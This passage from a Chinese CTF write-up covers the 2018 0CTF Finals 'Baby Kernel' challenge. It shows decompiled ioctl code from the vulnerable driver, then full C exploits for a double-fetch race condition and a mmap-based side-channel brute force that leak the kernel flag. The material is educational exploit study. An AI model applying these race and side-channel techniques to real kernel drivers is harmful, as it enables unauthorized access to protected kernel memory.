class="line"><span class="function">__int64 __fastcall <span class="title">baby_ioctl</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp-5Ch] [rbp-5Ch]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-58h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  v5 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6666</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;Your flag is at %px! But I don&#x27;t think you know it&#x27;s content\n&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x1337</span></span><br><span class="line">         &amp;&amp; (<span class="keyword">unsigned</span> __int8)_chk_range_not_ok(v2, <span class="number">16LL</span>, *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">4952</span>)) != <span class="number">1</span></span><br><span class="line">         &amp;&amp; (<span class="keyword">unsigned</span> __int8)_chk_range_not_ok(</span><br><span class="line">                               *(_QWORD *)v5,</span><br><span class="line">                               *(<span class="keyword">int</span> *)(v5 + <span class="number">8</span>),</span><br><span class="line">                               *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">4952</span>)) != <span class="number">1</span></span><br><span class="line">         &amp;&amp; *(_DWORD *)(v5 + <span class="number">8</span>) == <span class="built_in">strlen</span>(flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v5 + i) != flag[i] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;Looks like the flag is not a secret anymore. So here is it %s\n&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">14LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先可以看到函数分为两部分，第一部分就是打印出flag的地址，第二部分则是经过两次检验之后进入下面的逐字节对比。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> __fastcall _chk_range_not_ok(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">bool</span> v3; <span class="comment">// cf</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  v3 = __CFADD__(a2, a1);</span><br><span class="line">  v4 = a2 + a1;</span><br><span class="line">  <span class="keyword">return</span> v3 || a3 &lt; v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个验证函数些许看不懂，直接看汇编好一点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000000 55                            push    rbp</span><br><span class="line">.text:0000000000000001 48 01 F7                      add     rdi, rsi</span><br><span class="line">.text:0000000000000004 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000000007 72 08                         jb      short loc_11</span><br><span class="line">.text:0000000000000007</span><br><span class="line">.text:0000000000000009 48 39 FA                      cmp     rdx, rdi</span><br><span class="line">.text:000000000000000C 0F 92 C0                      setb    al</span><br><span class="line">.text:000000000000000F 5D                            pop     rbp</span><br><span class="line">.text:0000000000000010 C3                            retn</span><br><span class="line">.text:0000000000000010</span><br><span class="line">.text:0000000000000011                               ; -----------------------------------------------------------------------</span><br><span class="line">.text:0000000000000011</span><br><span class="line">.text:0000000000000011                               loc_11:                    ; CODE XREF: __chk_range_not_ok+7↑j</span><br><span class="line">.text:0000000000000011 B8 01 00 00 00                mov     eax, 1</span><br><span class="line">.text:0000000000000016 5D                            pop     rbp</span><br><span class="line">.text:0000000000000017 C3                            retn</span><br></pre></td></tr></table></figure><p>就是第一个参数和第二个参数的和必须小于第三个参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp; (<span class="keyword">unsigned</span> __int8)_chk_range_not_ok(v2, <span class="number">16LL</span>, *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">4952</span>)) != <span class="number">1</span></span><br><span class="line">    &amp;&amp; (<span class="keyword">unsigned</span> __int8)_chk_range_not_ok(</span><br><span class="line">    *(_QWORD *)v5,</span><br><span class="line">    *(<span class="keyword">int</span> *)(v5 + <span class="number">8</span>),</span><br><span class="line">    *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">4952</span>)) != <span class="number">1</span></span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/kernel-pwn%E5%9F%BA%E7%A1%80-2/image-20220324120500632.png"                      alt="image-20220324120500632"                ></p><p>可以看到这里其实就是看看传入的参数是否是用户态</p><p>这道提分为两种利用方式，这里都提一下(毕竟我都还不会)</p><h3 id="Double-Fetch"><a href="#Double-Fetch" class="headerlink" title="Double Fetch"></a>Double Fetch</h3><p>这一利用方式可以看做是条件竞争，这里是两次验证，第一次验证是否为用户态，第二次逐字检查flag，那么要是在第一检查结束后将地址换成正真的flag地址，那么后一个验证即可绕过</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> finished = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> Time = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">size_t</span> flag_addr;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fake_flag</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> *addr;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_flag_addr</span><span class="params">(<span class="keyword">void</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fake_flag</span> *<span class="title">a</span> =</span> s;</span><br><span class="line">    <span class="keyword">while</span> (finished == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        a-&gt;addr = flag_addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(argc, argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fake_flag</span> <span class="title">target</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6666</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; record.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> flag_addr_fd = open(<span class="string">&quot;./record.txt&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    lseek(flag_addr_fd, <span class="number">-0x1000</span>, SEEK_END);</span><br><span class="line">    read(flag_addr_fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    close(flag_addr_fd);</span><br><span class="line">    <span class="keyword">char</span> *idx;</span><br><span class="line">    idx = <span class="built_in">strstr</span>(buf, <span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">    flag_addr = strtoull(idx + <span class="number">16</span>, idx + <span class="number">32</span>, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]flag addr=&gt;%p\n&quot;</span>, flag_addr);</span><br><span class="line"></span><br><span class="line">    target.addr = buf;</span><br><span class="line">    target.size = <span class="number">33</span>;</span><br><span class="line">    <span class="keyword">pthread_t</span> thread;</span><br><span class="line">    pthread_create(&amp;thread, <span class="literal">NULL</span>, change_flag_addr, &amp;target);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Time; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ioctl(fd, <span class="number">0x1337</span>, &amp;target);</span><br><span class="line">        target.addr = buf;</span><br><span class="line">    &#125;</span><br><span class="line">    finished = <span class="number">1</span>;</span><br><span class="line">    pthread_join(thread, <span class="literal">NULL</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+]result is :&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="侧信道攻击"><a href="#侧信道攻击" class="headerlink" title="侧信道攻击"></a>侧信道攻击</h3><p>名字虽然听起来很高端，实际干的事情就是爆破每一个字节。</p><p>方法的原理就是：创建三个段，除了中间的段可读可写外，其他段的权限都为000，那么我们将flag放到第二个段的末尾，然后将猜测的字符放到最后一个，当最后一个字符不正确的时候就会直接退出，但是当最后一个字符正确的时候就会因为权限问题报错，并且系统崩溃</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/kernel-pwn%E5%9F%BA%E7%A1%80-2/image-20220324144534013.png"                      alt="image-20220324144534013"                ></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ch = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890,._-&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> command[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> command1[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    FILE *fd = fopen(<span class="string">&quot;save.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="built_in">fscanf</span>(fd, <span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">    fclose(fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(ch); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(command, <span class="string">&quot;echo \&quot;%s%c\&quot; &gt; save.txt&quot;</span>, flag, ch[i]);</span><br><span class="line">        <span class="built_in">sprintf</span>(command1, <span class="string">&quot;./exp %s%c&quot;</span>, flag, ch[i]);</span><br><span class="line">        system(command);</span><br><span class="line">        system(command1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">flag</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> addr;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_NONE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    buf = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_NONE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(argv[<span class="number">1</span>]); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[<span class="number">0x1000</span> - <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + i] = argv[<span class="number">1</span>][i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]flag=&gt;%s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">flag</span> <span class="title">target</span>;</span></span><br><span class="line">    target.size = <span class="number">33</span>;</span><br><span class="line">    target.addr = buf + <span class="number">0x1000</span> - <span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd, <span class="number">0x1337</span>, &amp;target);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;2018-0CTF-Finals-Baby-Kernel&quot;&gt;&lt;a href=&quot;#2018-0CTF-Finals-Baby-Kernel&quot; class=&quot;headerlink&quot; title=&quot;2018 0CTF Finals Baby Kernel&quot;&gt;&lt;/a&gt;20</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="Double Fetch" scheme="https://cv196082.gitee.io/tags/Double-Fetch/"/>
    
    <category term="侧信道攻击" scheme="https://cv196082.gitee.io/tags/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
</feed>
